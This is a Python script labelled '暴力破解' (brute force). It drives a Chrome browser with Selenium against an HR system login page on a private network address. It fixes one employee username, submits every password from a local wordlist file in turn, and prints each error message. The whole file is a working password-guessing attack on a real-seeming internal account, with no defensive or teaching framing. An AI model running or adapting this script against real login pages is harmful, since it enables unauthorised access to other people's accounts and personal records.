#! /usr/bin/env python3
# -*- coding:utf-8 -*-

# @Date    : 2018-08-14 11:04:49
# @Author  : Hume (102734075@qq.com)
# @Link    : https://humecry.wordpress.com/
# @Version : 1.0
# @Description:

'''
暴力破解
'''
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
	driver = webdriver.Chrome()
	driver.implicitly_wait(12)  # 隐性等待，最长等12秒
	driver.get("http://192.168.2.11/HR/login.aspx")
	driver.find_element_by_id("edtUserName").send_keys("3293")
	with open('d:/it03/桌面/mutou.txt', 'r') as f:
		for line in f:
			driver.find_element_by_id("edtPassWord").clear()
			driver.find_element_by_id("edtPassWord").send_keys(line)
			driver.find_element_by_id("LnkBtn_Login").click()
			sleep(1)
			print(line, driver.find_element_by_id("lblErrMsg").text)
except Exception as err:
	print(err)
finally:
	sleep(10)
	driver.quit()